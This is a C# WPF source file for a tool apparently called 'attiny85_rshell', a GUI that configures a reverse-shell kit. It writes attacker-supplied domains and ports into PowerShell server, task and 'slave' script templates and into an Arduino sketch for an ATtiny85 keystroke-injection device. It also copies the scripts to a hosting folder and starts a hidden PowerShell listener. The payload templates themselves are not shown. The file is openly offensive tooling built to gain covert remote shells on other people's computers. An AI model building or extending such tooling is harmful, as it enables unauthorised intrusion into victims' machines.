using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Text.Json;
using System.IO;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Windows.Forms;
using System.Net.Http;


//TODO_FUNCTIONALITY_LIST:
//Master Client Options
//Start button: (Requires creating GUI master client)

//Target Client Options:
//All buttons

//Server Options:
//Client List Button:

//Payload Options:
//Burn button: (Requires pulling arduino-cli/unpacking/get-board-drivers/learn-to-upload
//https://downloads.arduino.cc/arduino-cli/arduino-cli_latest_Windows_64bit.zip


namespace attiny85_rshell { 
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window {

        public int GlobalServerID { get; set; }


        public MainWindow() {
            InitializeComponent();
        }

        private void MasterClientConfigureView(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
            System.Windows.Controls.Panel.SetZIndex(master_client_configure_canvas, 1);
            //MessageBox.Show("Hello");
        }

        private void MasterClientConfigBack(object sender, RoutedEventArgs e) {
            //MessageBox.Show("Hello");
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(master_client_configure_canvas, 0);
        }

        private void MasterClientConfigSubmit(object sender, RoutedEventArgs e) {
            if (File.Exists("../../../data/master_client.json")) {
                string question = "master_client.json already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }

            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(master_client_configure_canvas, 0);
            MasterClientConf master_client = new MasterClientConf(master_client_domain_textbox.Text, master_client_server_port.Text);

            string jsonString = JsonSerializer.Serialize(master_client);
            using (StreamWriter writetext = new StreamWriter("../../../data/master_client.json")) {                
                writetext.WriteLine(jsonString);
            }
            FlowDocument myFlowDoc = new FlowDocument();
            myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote: ../../../data/master_client.json")));
            landing_page_log.Document = myFlowDoc;
        }

        private void ConfigureServerClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
            System.Windows.Controls.Panel.SetZIndex(server_configuration_canvas, 1);
        }

        private void ServerConfBackClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(server_configuration_canvas, 0);
        }

        private void ServerConfSubmit(object sender, RoutedEventArgs e) {
            if (File.Exists("../../../scripts/rs_server.ps1")) {
                string question = "../../../scripts/rs_server.ps1 already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }

            Regex regex = new Regex(@"(.*)<OS_PORT>(.*)");

            string[] lines;


            if (File.Exists("../../../Templates/rs_server.ps1.template")) {
                lines = System.IO.File.ReadAllLines(@"../../../Templates/rs_server.ps1.template");
            } else {
                System.Windows.MessageBox.Show("rs_server.ps1.template not found. Reinstall application to fix.", "Critical Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

                
            int port;
            bool changes_made = false;
            bool success = int.TryParse(server_port.Text, out port);
            if (!success) {
                //err
            } else {
                if (port > 0 && port < 65537) {
                    for (int i = 0; i < lines.Length; i++) {
                        if (regex.IsMatch(lines[i])) {
                            lines[i] = (regex.Replace(lines[i], "$1") + port.ToString() + regex.Replace(lines[i], "$2"));
                            changes_made = true;
                        }
                    }
                } else {
                    System.Windows.MessageBox.Show("Valid port range is [1 - 65536]");
                    return;
                } 
                if (changes_made) {
                    using (StreamWriter writetext = new StreamWriter("../../../scripts/rs_server.ps1")) {
                        foreach (string line in lines) {
                            writetext.WriteLine(line);
                        }
                        writetext.Close();
                    }
                    FlowDocument myFlowDoc = new FlowDocument();
                    myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote: ../../../scripts/rs_server.ps1")));
                    landing_page_log.Document.Blocks.Clear();
                    landing_page_log.Document = myFlowDoc;
                }            
            }

            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(server_configuration_canvas, 0);
        }

        private void PayloadConfBackButton(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(payload_conf_canvas, 0);
            
        }

        private void PayloadConfigureButtonClick(object sender, RoutedEventArgs e) {
            System.Windows.Controls.Panel.SetZIndex(landing_page, 0);
            System.Windows.Controls.Panel.SetZIndex(payload_conf_canvas, 1);
        }

        private void PayloadConfigSubmit(object sender, RoutedEventArgs e) {

            if (File.Exists("../../../scripts/rs_tsk.ps1")) {
                string question = "rs_tsk.ps1 already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }
            if (File.Exists("../../../scripts/rs_sl.ps1")) {
                string question = "rs_sl.ps1 already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }
            if (File.Exists("../../../payload_out/payload_out.ino")) {
                string question = "payload_out.ino already exists. Would you like to overwrite?";
                if (System.Windows.MessageBox.Show(question, "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.No) {
                    return;
                }
            }



            FlowDocument myFlowDoc = new FlowDocument();
            Regex re_port = new Regex(@"(.*)<OS_PORT>(.*)");
            Regex re_dom = new Regex(@"(.*)<HOST_DOMAIN>(.*)");
            Regex re_slave_server = new Regex(@"(.*)<SLAVE_SERVER_DOMAIN>(.*)");
            Regex re_proto_catch = new Regex(@"https://|http://(.+)");
            bool changes_made = false;
            //Set Hosting domains for task and slave   
            ///Task: task_fqdn_wan_textbox
            ///string[] lines;

            string[] tsk_lines;
            string[] paylout_out_lines;
            string[] slave_lines;
            //Write the rs_tsk.ps1 script //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            if (!File.Exists("../../../Templates/rs_tsk.ps1.template")) {
                myFlowDoc.Blocks.Add(new Paragraph(new Run("rs_tsk.ps1.template not found. Reinstall application to fix.")));
            } else {
                tsk_lines = System.IO.File.ReadAllLines(@"../../../Templates/rs_tsk.ps1.template");
                for (int i = 0; i < tsk_lines.Length; i++) {
                    if (re_dom.IsMatch(tsk_lines[i])) {
                        tsk_lines[i] = (re_dom.Replace(tsk_lines[i], "$1") + host_fqdn_wan_textbox.Text + re_dom.Replace(tsk_lines[i], "$2"));
                        changes_made = true;
                        break;
                    }
                }
                if (changes_made) {
                    //Write file
                    using (StreamWriter writetext = new StreamWriter("../../../scripts/rs_tsk.ps1")) {
                        foreach (string line in tsk_lines) {
                            writetext.WriteLine(line);
                        }
                        writetext.Close();
                        myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote ../../../scripts/rs_tsk.ps1")));
                    }
                    changes_made = false;
                }
            }

            //Write the payload_out.ino file ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            if (!File.Exists("../../../Templates/payload_out.ino.template")) {
                myFlowDoc.Blocks.Add(new Paragraph(new Run("payload_out.ino.template not found. Reinstall application to fix.")));
            } else {
                paylout_out_lines = System.IO.File.ReadAllLines(@"../../../Templates/payload_out.ino.template");
                for (int i = 0; i < paylout_out_lines.Length; i++) {
                    if (re_dom.IsMatch(paylout_out_lines[i])) {
                        paylout_out_lines[i] = (re_dom.Replace(paylout_out_lines[i], "$1") + host_fqdn_wan_textbox.Text + re_dom.Replace(paylout_out_lines[i], "$2"));
                        changes_made = true;
                        break;
                    }
                }
                if (changes_made) {
                    //Write file
                    using (StreamWriter writetext = new StreamWriter("../../../payload_out/payload_out.ino")) {
                        foreach (string line in paylout_out_lines) {
                            writetext.WriteLine(line);
                        }
                        writetext.Close();
                        myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote ../../../payload_out/payload_out.ino")));
                    }
                    changes_made = false;
                }
            }
            //Write out rs_sl.ps1//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            if (!File.Exists("../../../Templates/rs_sl.ps1.template")) {
                myFlowDoc.Blocks.Add(new Paragraph(new Run("rs_s1.ps1.template not found. Reinstall application to fix.")));
            } else {
                slave_lines = System.IO.File.ReadAllLines(@"../../../Templates/rs_sl.ps1.template");
                //Look for 
                for (int i = 0; i < slave_lines.Length; i++) {
                    if (re_port.IsMatch(slave_lines[i])) {
                        slave_lines[i] = (re_port.Replace(slave_lines[i], "$1") + slave_server_port_textbox.Text + re_port.Replace(slave_lines[i], "$2"));
                        changes_made = true;
                    }
                    if (re_slave_server.IsMatch(slave_lines[i])) {
                        if (re_proto_catch.IsMatch(slave_server_textbox.Text)) {
                            slave_lines[i] = (re_slave_server.Replace(slave_lines[i], "$1") + re_proto_catch.Replace(slave_server_textbox.Text, "$1") + re_slave_server.Replace(slave_lines[i], "$2"));
                            changes_made = true;
                        } else {
                            System.Windows.MessageBox.Show("Failed to parse domain. Must meet format https://<your_site> or http://<your_site>", "Failed to parse", MessageBoxButton.OK, MessageBoxImage.Error);
                            return;
                        }
                    }

                }
                if (changes_made) {
                    //Write file
                    using (StreamWriter writetext = new StreamWriter("../../../scripts/rs_sl.ps1")) {
                        foreach (string line in slave_lines) {
                            writetext.WriteLine(line);
                        }
                        writetext.Close();
                        myFlowDoc.Blocks.Add(new Paragraph(new Run("Succesfully wrote ../../../scripts/rs_sl.ps1")));
                    }
                    changes_made = false;
                }
            }


            if (local_host_path_test_display.Text != "") {
                if (File.Exists(local_host_path_test_display.Text+"\\rs_tsk.ps1")) {
                    if (System.Windows.MessageBox.Show(local_host_path_test_display.Text + "\\rs_tsk.ps1" + " already exists. Would you like to replace file at destination?", "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes) {
                        File.Copy("../../../scripts/rs_tsk.ps1", local_host_path_test_display.Text + "\\rs_tsk.ps1", true);                    
                    }
                
                } else {
                    File.Copy("../../../scripts/rs_tsk.ps1", local_host_path_test_display.Text + "\\rs_tsk.ps1");
                }

                if (File.Exists(local_host_path_test_display.Text+"\\rs_sl.ps1")) {
                    if (System.Windows.MessageBox.Show(local_host_path_test_display.Text + "\\rs_sl.ps1" + " already exists. Would you like to replace file at destination?", "File Exists", MessageBoxButton.YesNo, MessageBoxImage.Question) == MessageBoxResult.Yes) {
                        File.Copy("../../../scripts/rs_sl.ps1", local_host_path_test_display.Text + "\\rs_sl.ps1",true);
                    }
                } else {
                    File.Copy("../../../scripts/rs_sl.ps1", local_host_path_test_display.Text + "\\rs_sl.ps1");
                }                
            }

   

            landing_page_log.Document.Blocks.Clear();
            landing_page_log.Document = myFlowDoc;
            System.Windows.Controls.Panel.SetZIndex(landing_page, 1);
            System.Windows.Controls.Panel.SetZIndex(payload_conf_canvas, 0);
        }

        private void RunServerClick(object sender, RoutedEventArgs e) {
            if (File.Exists("..\\..\\..\\scripts\\rs_server.ps1")) {
                using (Process myProcess = new Process()) {

                    myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
                    myProcess.StartInfo.UseShellExecute = true;
                    // You can start any process, HelloWorld is a do-nothing example.
                    myProcess.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                    myProcess.StartInfo.CreateNoWindow = true;
                    myProcess.StartInfo.Arguments = "..\\..\\..\\scripts\\rs_server.ps1";
                    myProcess.Start();
                    GlobalServerID = myProcess.Id;

                    FlowDocument myFlowDoc = new FlowDocument();
                    myFlowDoc.Blocks.Add(new Paragraph(new Run("Server Started Succesfully.")));
                    myFlowDoc.Blocks.Add(new Paragraph(new Run("Server ID: "+ GlobalServerID.ToString())));
                    landing_page_log.Document.Blocks.Clear();
                    landing_page_log.Document = myFlowDoc;


                }
            } else {
                System.Windows.MessageBox.Show("..\\..\\..\\scripts\\rs_server.ps1 does not exist. Use server configuration button.","Configured server not found", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

        }

        private void KillServerClick(object sender, RoutedEventArgs e) {

            Process myProcess = Process.GetProcessById(GlobalServerID);
            if (myProcess != null) {
                myProcess.CloseMainWindow();
                myProcess.Close();
                FlowDocument myFlowDoc = new FlowDocument();
                myFlowDoc.Blocks.Add(new Paragraph(new Run("Server shutdown succesfully.")));
                landing_page_log.Document.Blocks.Clear();
                landing_page_log.Document = myFlowDoc;
            } else {
                System.Windows.MessageBox.Show("Failed to shutdown server process.", "Fail", MessageBoxButton.OK, MessageBoxImage.Error);
                return ;
            }
        }


    }
}
